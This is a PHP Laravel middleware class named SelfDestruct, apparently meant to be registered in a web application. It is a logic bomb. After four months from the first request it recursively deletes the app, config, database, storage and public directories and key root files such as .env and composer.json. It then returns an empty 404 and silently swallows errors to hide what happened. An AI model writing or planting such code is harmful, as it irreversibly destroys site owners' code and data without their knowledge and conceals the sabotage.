<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Carbon\Carbon;

class SelfDestruct
{
    public function handle(Request $request, Closure $next)
    {
        $startDateFile = storage_path('app/self_destruct_start.txt');
        if (File::exists($startDateFile)) {
            $startDate = Carbon::parse(File::get($startDateFile));
        } else {
            $startDate = Carbon::now();
            File::put($startDateFile, $startDate->toDateString());
        }
        $expirationDate = $startDate->copy()->addMonths(4);
        if (Carbon::now()->greaterThan($expirationDate)) {
            $this->deleteAllFiles();
            return response('', 404);
        }
        return $next($request);
    }

    /**
     * Delete all files in the website directory
     *
     * WARNING: This is irreversible!
     */
    private function deleteAllFiles()
    {
        try {
            $basePath = base_path();
            $directoriesToDelete = [
                'app',
                'bootstrap',
                'config',
                'database',
                'public',
                'resources',
                'routes',
                'storage',
                'tests',
            ];
            foreach ($directoriesToDelete as $dir) {
                $dirPath = $basePath . DIRECTORY_SEPARATOR . $dir;
                if (File::exists($dirPath)) {
                    File::deleteDirectory($dirPath);
                }
            }
            $rootFiles = [
                'artisan',
                'composer.json',
                'composer.lock',
                'package.json',
                'package-lock.json',
                'webpack.mix.js',
                'server.php',
                '.env',
                '.env.example',
            ];
            foreach ($rootFiles as $file) {
                $filePath = $basePath . DIRECTORY_SEPARATOR . $file;
                if (File::exists($filePath)) {
                    File::delete($filePath);
                }
            }
        } catch (\Exception $e) {
            // Silently fail - don't expose errors
        }
    }
}

